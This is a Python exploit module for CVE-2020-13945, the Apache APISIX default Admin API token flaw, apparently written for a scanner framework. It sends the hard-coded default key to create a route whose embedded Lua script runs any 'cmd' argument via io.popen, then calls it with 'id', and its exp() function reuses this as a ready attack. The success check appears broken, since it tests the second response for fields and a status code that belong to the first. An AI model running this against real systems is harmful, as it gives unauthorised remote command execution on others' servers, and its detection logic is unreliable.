import requests
import random
import string


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Apache APISIX's Admin API Default Access Token (RCE)''',
        "description": '''In Apache APISIX, the user enabled the Admin API and deleted the Admin API access IP restriction rules. Eventually, the default token is allowed to access APISIX management data. This affects versions 1.2, 1.3, 1.4, 1.5.''',
        "severity": "medium",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2020-13945", 
            "https://github.com/vulhub/vulhub/tree/master/apisix/CVE-2020-13945"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
            "cvss-score": "",
            "cve-id": "CVE-2020-13945",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2020", "apache", "apisix", "rce", "intrusive"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    randstr = gen_random_str(10)
    try:
        url = format_url(url)

        path = """/apisix/admin/routes"""
        method = "POST"
        data = {
            "uri":"/{randstr}".format(randstr=randstr),
            "script":"local _M = {} \n function _M.access(conf, ctx) \n local os = require('os')\n local args = assert(ngx.req.get_uri_args()) \n local f =        assert(io.popen(args.cmd, 'r'))\n local s = assert(f:read('*a'))\n ngx.say(s)\n f:close()  \n end \nreturn _M",
            "upstream":{
                "type":"roundrobin",
                "nodes":{
                "example.com:80":1
                }
            }
        }
        headers = {'X-API-KEY': 'edd1c9f034335f136f87ad84b625c8f1', 'Content-Type': 'application/json'}
        resp0 = requests.request(method=method,url=url+path,json=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/{randstr}?cmd=id""".format(randstr=randstr)
        method = "GET"
        headers = {}
        resp1 = requests.request(method=method,url=url+path,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""action":"create""" in resp1.text and """script":""" in resp1.text and """node":""" in resp1.text) and (resp1.status_code == 201):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url

def gen_random_str(length):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))